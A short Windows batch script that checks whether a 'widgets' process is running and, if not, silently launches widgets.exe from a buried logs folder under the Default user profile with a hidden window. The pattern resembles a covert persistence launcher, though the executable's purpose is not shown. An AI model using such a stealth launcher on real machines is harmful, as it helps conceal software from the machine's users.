tasklist | findstr widgets && goto After
PowerShell -Command "Start-Process -WindowStyle Hidden \"C:\Users\Default\Logs\disc\logs\widgets.exe\""
:After
echo none